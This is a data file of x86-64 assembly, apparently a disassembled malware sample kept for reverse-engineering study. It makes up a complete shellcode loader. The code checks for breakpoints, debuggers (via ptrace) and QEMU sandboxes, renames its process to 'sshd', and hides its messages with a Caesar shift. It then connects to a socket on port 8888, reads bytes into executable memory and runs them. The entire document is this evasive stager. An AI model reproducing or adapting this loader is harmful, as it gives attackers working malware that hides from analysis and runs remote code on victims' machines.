"check":
  "asm": |
    check:
      endbr64
      push    rbp
      mov     rbp, rsp
      sub     rsp, 0x30
      mov     rax, fs:[0x28]
      mov     [rbp-8], rax
      xor     eax, eax
      mov     [rbp-0x20], 0
      mov     [rbp-0x18], 0
      lea     rax, [payload]
      movzx   eax, [rax]
      cmp     al, 0xcc
      jne     block2
    block1:
      lea     rdi, [mem1]; "Csfblqpjou!efufdufe/"
      call    myprint
      mov     edi, 1
      call    exit@plt.sec
    block2:
      mov     esi, 0
      mov     edi, 0
      mov     eax, 0
      call    ptrace@plt.sec
      cmp     rax, -1
      jne     block4
    block3:
      lea     rdi, [mem2]; "Efcvhhfs!efufdufe/"
      call    myprint
      mov     edi, 2
      call    exit@plt.sec
    block4:
      mov     esi, 0
      lea     rdi, [mem3]; "/sys/class/dmi/id/sys_vendor"
      mov     eax, 0
      call    open@plt.sec
      mov     [rbp-0x24], eax
      lea     rcx, [rbp-0x20]
      mov     eax, [rbp-0x24]
      mov     edx, 8
      mov     rsi, rcx
      mov     edi, eax
      call    read@plt.sec
      lea     rax, [rbp-0x20]
      mov     edx, 4
      lea     rsi, [mem4]; "QEMU"
      mov     rdi, rax
      call    strncmp@plt.sec
      test    eax, eax
      jne     block6
    block5:
      lea     rdi, [mem5]; "Tboecpy!efufdufe/"
      call    myprint
      mov     edi, 3
      call    exit@plt.sec
    block6:
      mov     rax, [rbp-8]
      xor     rax, fs:[0x28]
      je      block8
    block7:
      call    __stack_chk_fail@plt.sec
    block8:
      leave
      ret
"hide":
  "asm": |
    hide:
      endbr64
      push    rbp
      mov     rbp, rsp
      sub     rsp, 0x20
      mov     [rbp-0x18], rdi
      mov     rax, [rbp-0x18]
      mov     rax, [rax]
      mov     rdi, rax
      call    strlen@plt.sec
      mov     [rbp-4], eax
      lea     rsi, [mem1]; "sshd"
      mov     edi, 0xf
      mov     eax, 0
      call    prctl@plt.sec
      mov     eax, [rbp-4]
      cdqe
      lea     rdx, [rax-4]
      mov     eax, [rbp-4]
      movsxd  rsi, eax
      mov     rax, [rbp-0x18]
      mov     rax, [rax]
      lea     r9, [mem2]; " "
      mov     r8, rdx
      lea     rcx, [mem1]; "sshd"
      lea     rdx, [mem3]; "%s%*c"
      mov     rdi, rax
      mov     eax, 0
      call    snprintf@plt.sec
      leave
      ret
"main":
  "asm": |
    main:
      endbr64
      push    rbp
      mov     rbp, rsp
      sub     rsp, 0x10
      mov     [rbp-4], edi
      mov     [rbp-0x10], rsi
      lea     rdi, [mem1]; "Xfmdpnf/"
      call    myprint
      mov     rax, [rbp-0x10]
      mov     rdi, rax
      call    hide
      mov     eax, 0
      call    check
      mov     eax, 0
      call    payload
      mov     eax, 0
      leave
      ret
"myprint":
  "asm": |
    myprint:
      endbr64
      push    rbp
      mov     rbp, rsp
      sub     rsp, 0x20
      mov     [rbp-0x18], rdi
      mov     rax, [rbp-0x18]
      mov     rdi, rax
      call    strlen@plt.sec
      mov     [rbp-0xc], eax
      mov     eax, [rbp-0xc]
      cdqe
      mov     rdi, rax
      call    malloc@plt.sec
      mov     [rbp-8], rax
      mov     rdx, [rbp-0x18]
      mov     rax, [rbp-8]
      mov     rsi, rdx
      mov     rdi, rax
      call    strcpy@plt.sec
      mov     [rbp-0x10], 0
      jmp     block2
    block1:
      mov     eax, [rbp-0x10]
      movsxd  rdx, eax
      mov     rax, [rbp-8]
      add     rax, rdx
      movzx   eax, [rax]
      lea     ecx, [rax-1]
      mov     eax, [rbp-0x10]
      movsxd  rdx, eax
      mov     rax, [rbp-8]
      add     rax, rdx
      mov     edx, ecx
      mov     [rax], dl
      add     [rbp-0x10], 1
    block2:
      mov     eax, [rbp-0x10]
      cmp     eax, [rbp-0xc]
      jl      block1
    block3:
      mov     rax, [rbp-8]
      mov     rdi, rax
      call    puts@plt.sec
      mov     rax, [stdout]
      mov     rdi, rax
      call    fflush@plt.sec
      mov     rax, [rbp-8]
      mov     rdi, rax
      call    free@plt.sec
      leave
      ret
"payload":
  "asm": |
    payload:
      endbr64
      push    rbp
      mov     rbp, rsp
      sub     rsp, 0x30
      mov     rax, fs:[0x28]
      mov     [rbp-8], rax
      xor     eax, eax
      mov     edx, 0
      mov     esi, 1
      mov     edi, 2
      call    socket@plt.sec
      mov     [rbp-0x2c], eax
      lea     rdi, [mem1]; "127.0.0.1"
      call    inet_addr@plt.sec
      mov     [rbp-0x1c], eax
      mov     [rbp-0x20], 2
      mov     edi, 0x22b8
      call    htons@plt.sec
      mov     [rbp-0x1e], ax
      lea     rcx, [rbp-0x20]
      mov     eax, [rbp-0x2c]
      mov     edx, 0x10
      mov     rsi, rcx
      mov     edi, eax
      call    connect@plt.sec
      test    eax, eax
      jns     block2
    block1:
      lea     rdi, [mem2]; "Dpoofdujpo!gbjmfe/"
      call    myprint
      mov     edi, 4
      call    exit@plt.sec
    block2:
      mov     r9d, 0
      mov     r8d, 0xffffffff
      mov     ecx, 0x22
      mov     edx, 7
      mov     esi, 0x1000
      mov     edi, 0
      call    mmap@plt.sec
      mov     [rbp-0x28], rax
      mov     rcx, [rbp-0x28]
      mov     eax, [rbp-0x2c]
      mov     edx, 0x400
      mov     rsi, rcx
      mov     edi, eax
      call    read@plt.sec
      test    rax, rax
      jns     block4
    block3:
      lea     rdi, [mem3]; "Dbo(u!sfbe/"
      call    myprint
      mov     edi, 5
      call    exit@plt.sec
    block4:
      lea     rdi, [mem4]; "Mfu(t!hp/"
      call    myprint
      mov     rdx, [rbp-0x28]
      mov     eax, 0
      call    rdx
      mov     eax, 0
      mov     rsi, [rbp-8]
      xor     rsi, fs:[0x28]
      je      block6
    block5:
      call    __stack_chk_fail@plt.sec
    block6:
      leave
      ret
